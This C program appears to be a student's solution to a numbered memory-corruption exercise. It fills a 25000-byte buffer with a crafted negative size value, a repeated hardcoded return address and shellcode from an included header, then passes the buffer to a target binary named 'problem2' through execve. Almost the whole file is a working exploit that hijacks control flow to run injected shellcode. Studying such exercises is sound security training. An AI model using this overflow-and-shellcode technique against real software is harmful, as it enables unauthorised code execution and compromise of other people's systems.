#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "problem2"

int main(void)
{
  printf("111111111111");
  char *args[3];
  char *env[1];

	char sizeVal[] = "-134216988,";
 	long *addr;
	char *buff;
	buff = (char*) malloc(25000);

	int s = strlen(sizeVal);
	int fillNums = s%4;
	
	addr = (long *)(buff+fillNums);

	for(int i = 0; i<25000; i+=4){
		*addr = 0xbfff4110;
		addr++;
	}	

	for(int i = 0; i<s; ++i){
		*(buff+i) = sizeVal[i];
	}

	for(int i = 0; i<strlen(shellcode); ++i){
		*(buff+i+s) = shellcode[i];
	}


  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;
  //printf("%s", buff);
  //printf("123123123");

  if (0 > execve(TARGET, args, env))
    printf("execve failed.\n");

  return 0;
}
